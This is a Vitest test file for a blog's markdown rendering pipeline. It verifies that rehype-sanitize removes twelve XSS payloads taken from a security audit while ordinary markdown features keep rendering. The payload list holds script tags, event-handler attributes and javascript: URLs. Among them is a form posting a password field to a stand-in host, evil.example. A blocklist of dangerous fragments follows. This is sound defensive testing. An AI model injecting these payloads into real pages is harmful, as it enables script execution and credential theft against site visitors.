// SEC-03: a post's markdown passes rehype-sanitize after rehype-raw.
//
// The 12 payloads are the ones the audit pushed through react-markdown 10.1 +
// rehype-raw 7 without a sanitizer (all of them came out intact). Here the
// same shared pipeline (src/lib/markdown/pipeline.js, the one PostMarkdown and
// the W7 server snapshot use) must leave none of them dangerous, while the
// content the blog really uses (GFM table, code, mermaid fence, details,
// task lists, footnotes) renders as before.
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { describe, expect, it } from "vitest";
import {
  rehypePlugins,
  remarkPlugins,
  remarkRehypeOptions,
} from "../../../src/lib/markdown/pipeline.js";
import {
  BLOCKED_TAGS,
  sanitizeSchema,
} from "../../../src/lib/markdown/sanitizeSchema.js";

const html = (markdown) =>
  renderToStaticMarkup(
    <ReactMarkdown
      remarkPlugins={remarkPlugins}
      rehypePlugins={rehypePlugins}
      remarkRehypeOptions={remarkRehypeOptions}
    >
      {markdown}
    </ReactMarkdown>,
  );

const PAYLOADS = [
  "<script>alert(1)</script>",
  '<img src=x onerror="alert(2)">',
  "[x](javascript:alert(3))",
  '<a href="javascript:alert(4)">y</a>',
  '<iframe srcdoc="<script>alert(5)</script>"></iframe>',
  '<form action="https://evil.example/steal"><input name="pw"></form>',
  "<style>body{display:none}</style>",
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/">',
  '<object data="https://evil.example/x.swf"></object>',
  '<embed src="https://evil.example/x.swf">',
  '<svg onload="alert(12)"></svg>',
];

const FORBIDDEN = [
  "<iframe",
  "<form",
  "<style",
  "<meta",
  "<base",
  "<object",
  "<embed",
  "<script",
  "srcdoc",
  "onerror",
  "onload",
  "javascript:",
];

describe("the 12 audit payloads (SEC-03)", () => {
  it("leaves none of the dangerous tags, attributes or URLs in the output", () => {
    const output = html(PAYLOADS.join("\n\n"));
    for (const fragment of FORBIDDEN) {
      expect(output, fragment).not.toContain(fragment);
    }
  });

  it.each(PAYLOADS.map((payload, i) => [i + 1, payload]))(
    "payload %i on its own is clean",
    (_n, payload) => {
      const output = html(payload);
      for (const fragment of FORBIDDEN) {
        expect(output, fragment).not.toContain(fragment);
      }
    },
  );

  it("does not leave the source of a dropped <script> or <style> as text", () => {
    const output = html(
      "a <script>alert(1)</script> b\n\n<style>body{display:none}</style>",
    );
    expect(output).not.toContain("alert(1)");
    expect(output).not.toContain("display:none");
  });

  it("keeps a link's text when its javascript: URL is dropped", () => {
    const output = html("[click me](javascript:alert(1))");
    expect(output).toContain("click me");
    expect(output).not.toContain("href");
  });

  it("drops a blocked tag even if the default schema ever allows it", () => {
    for (const tag of BLOCKED_TAGS) {
      expect(sanitizeSchema.tagNames).not.toContain(tag);
    }
    expect(sanitizeSchema.strip).toEqual(
      expect.arrayContaining(["script", "style"]),
    );
  });

  it("allows no SVG in the body: diagrams stay markdown source (T-05)", () => {
    expect(sanitizeSchema.tagNames).not.toContain("svg");
    const output = html('<svg viewBox="0 0 1 1"><circle r="1"/></svg>');
    expect(output).not.toContain("<svg");
    expect(output).not.toContain("<circle");
  });
});

// React hides part of the problem in the rendered string: it never sets a
// string `onerror` and refuses `javascript:` hrefs. The server snapshot
// (SEO-01) has no such net, so the allowlist itself is checked on the tree
// rehype-sanitize hands over: no blocked element, no on* property, no
// javascript: value anywhere.
function sanitizedTree(markdown) {
  let tree = null;
  renderToStaticMarkup(
    <ReactMarkdown
      remarkPlugins={remarkPlugins}
      rehypePlugins={[
        ...rehypePlugins,
        () => (root) => {
          tree = root;
        },
      ]}
      remarkRehypeOptions={remarkRehypeOptions}
    >
      {markdown}
    </ReactMarkdown>,
  );
  return tree;
}

function elements(node, found = []) {
  if (node.type === "element") found.push(node);
  for (const child of node.children ?? []) elements(child, found);
  return found;
}

describe("the tree after rehype-sanitize (what the server snapshot prints)", () => {
  const nodes = elements(sanitizedTree(PAYLOADS.join("\n\n")));

  it("has no blocked or SVG element", () => {
    const tags = nodes.map((node) => node.tagName);
    expect(tags.length).toBeGreaterThan(0);
    for (const tag of [...BLOCKED_TAGS, "svg"]) {
      expect(tags, tag).not.toContain(tag);
    }
  });

  it("has no event-handler property and no javascript:/srcdoc value", () => {
    const properties = nodes.flatMap((node) =>
      Object.entries(node.properties ?? {}),
    );
    for (const [name, value] of properties) {
      expect(name.toLowerCase(), name).not.toMatch(/^on/);
      expect(name.toLowerCase(), name).not.toBe("srcdoc");
      expect(String(value).toLowerCase(), name).not.toContain("javascript:");
    }
  });
});

describe("attributes and URLs", () => {
  it("removes event handlers and class/style from raw elements", () => {
    const output = html(
      '<div class="mermaid-diagram" style="position:fixed" onclick="x()">t</div>',
    );
    expect(output).toContain("t");
    expect(output).not.toMatch(/class=|style=|onclick/);
  });

  it("drops form attributes the global list would keep", () => {
    const output = html('<div action="javascript:x()" method="post">t</div>');
    expect(output).not.toMatch(/action|method|javascript/);
  });

  it("allows http, https and mailto links only", () => {
    const output = html(
      [
        "[a](https://example.com/a)",
        "[b](http://example.com/b)",
        "[c](mailto:a@example.com)",
        "[d](irc://example.com/chan)",
        "[e](data:text/html,x)",
      ].join("\n\n"),
    );
    expect(output).toContain('href="https://example.com/a"');
    expect(output).toContain('href="http://example.com/b"');
    expect(output).toContain('href="mailto:a@example.com"');
    expect(output).not.toContain("irc:");
    expect(output).not.toContain("data:");
  });

  it("allows http(s) and relative images, not data: or javascript: sources", () => {
    const output = html(
      [
        "![a](https://example.com/a.png)",
        "![b](/img/b.png)",
        "![c](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)",
      ].join("\n\n"),
    );
    expect(output).toContain('src="https://example.com/a.png"');
    expect(output).toContain('src="/img/b.png"');
    expect(output).not.toContain("data:");
  });

  it("prefixes author ids and points fragment links at them", () => {
    const output = html('<h2 id="setup">Setup</h2>\n\n<a href="#setup">go</a>');
    expect(output).toContain('id="user-content-setup"');
    expect(output).toContain('href="#user-content-setup"');
  });

  it("keeps <input> only inside list items (GFM task lists)", () => {
    const stray = html('<input type="text" value="x">');
    expect(stray).not.toContain("<input");
    const tasks = html("- [x] done\n- [ ] todo");
    expect(tasks.match(/<input type="checkbox" disabled=""/g)).toHaveLength(2);
    expect(tasks).toContain("checked");
  });
});

describe("what a post uses still renders (SEC-03 criteria)", () => {
  it("keeps language-* on code, so a mermaid fence is recognisable", () => {
    const output = html("```mermaid\nflowchart TD\n  A-->B\n```");
    expect(output).toContain('class="language-mermaid"');
    expect(output).toContain("flowchart TD");
  });

  it("keeps the language class of ordinary code and drops other classes", () => {
    const output = html(
      '```ts\nconst a = 1;\n```\n\n<code class="evil language-x">y</code>',
    );
    expect(output).toContain('class="language-ts"');
    expect(output).not.toContain("evil");
  });

  it("renders a GFM table", () => {
    const output = html("| a | b |\n|---|:-:|\n| 1 | 2 |");
    expect(output).toContain("<table>");
    expect(output).toContain("<th>a</th>");
    expect(output).toContain("<td>1</td>");
  });

  it("keeps <details><summary>", () => {
    const output = html("<details><summary>More</summary>hidden</details>");
    expect(output).toContain("<details>");
    expect(output).toContain("<summary>More</summary>");
  });

  it("renders inline code, lists, quotes, rules and emphasis", () => {
    const output = html("**b** *i* `c`\n\n- x\n\n1. y\n\n> q\n\n---\n\n~~s~~");
    for (const fragment of [
      "<strong>b</strong>",
      "<em>i</em>",
      "<code>c</code>",
      "<ul>",
      "<ol>",
      "<blockquote>",
      "<hr/>",
      "<del>s</del>",
    ]) {
      expect(output, fragment).toContain(fragment);
    }
  });

  it("keeps footnote links working: the ids are prefixed exactly once", () => {
    const output = html("Claim[^1]\n\n[^1]: The note.");
    expect(output).toContain('id="user-content-fn-1"');
    expect(output).toContain('href="#user-content-fn-1"');
    expect(output).toContain('id="user-content-fnref-1"');
    expect(output).toContain('href="#user-content-fnref-1"');
    expect(output).not.toContain("user-content-user-content");
  });
});
